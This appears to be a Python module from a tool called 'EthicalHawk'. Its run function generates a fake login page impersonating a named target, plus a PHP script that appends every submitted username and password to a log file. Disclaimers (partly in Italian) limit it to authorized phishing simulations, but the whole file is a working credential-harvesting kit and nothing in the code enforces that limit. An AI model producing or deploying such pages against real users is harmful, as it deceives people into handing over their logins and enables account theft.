"""
phishing_generator.py - Ethical Phishing Page Generator for EthicalHawk

NOTE: Questo script genera una pagina di login fasulla SOLO per simulazioni di sicurezza autorizzate!
"""

def run(target, config):
    html = f"""<!-- USE ONLY FOR AUTHORIZED ETHICAL PHISHING TESTS! -->
<html>
<head><title>Login | {target}</title></head>
<body>
<h2>Login a {target}</h2>
<form method="POST" action="collect.php">
  <input type="text" name="user" placeholder="Email"><br>
  <input type="password" name="pass" placeholder="Password"><br>
  <button type="submit">Login</button>
</form>
</body>
</html>
"""
    php = '''<?php
// USE ONLY FOR AUTHORIZED SECURITY TESTS!
// This script collects login for authorized simulation.
if(isset($_POST['user']) && isset($_POST['pass'])) {
    file_put_contents("log.txt", $_POST['user'].":".$_POST['pass']."\\n", FILE_APPEND);
}
?>'''
    return {"html": html, "php": php}